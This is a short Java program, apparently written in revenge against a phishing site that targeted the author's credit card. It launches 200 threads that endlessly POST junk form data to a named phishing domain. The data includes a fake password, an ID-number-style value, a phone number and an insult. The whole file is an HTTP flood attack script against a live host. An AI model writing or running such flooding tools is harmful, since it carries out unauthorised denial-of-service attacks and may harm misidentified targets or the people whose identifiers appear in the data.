package com.card;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.PostMethod;

/**
 * @ClassName:InsertCode.java
 * @Description:背景：行用卡信息泄露，连续两次收到钓鱼网站信息，让我填写银行卡信息提升信用卡额度。
 * @see:是可忍，熟不可忍。
 * @author gaoguangjin
 * @Date 2015-7-1 上午11:13:58
 */
public class InsertCode {
	static int m = 0;
	
	public static void main(String[] args) {
		String url = "http://dhina95528.com/ok.php";
		HttpClient client = new HttpClient();
		thread(client, url);
	}
	
	public static void thread(final HttpClient client, final String url) {
		for (int i = 0; i < 200; i++) {
			new Thread() {
				public void run() {
					while (true) {
						insert(client, url);
					}
				}
			}.start();
		}
	}
	
	private static void insert(HttpClient client, String url) {
		PostMethod postMethod = new PostMethod(url);
		try {
			
			postMethod.setParameter("umm", "123123");
			postMethod.setParameter("usfz", "110101198808085638");
			postMethod.setParameter("usjh", "18638217777");
			postMethod.setParameter("uxm", "傻逼啊");
			
			int stat = client.executeMethod(postMethod);
			
			if (stat == 200)
				System.out.println(m++);
			
		} catch (Exception e) {
			
		}
		finally {
			postMethod.releaseConnection();
		}
	}
}
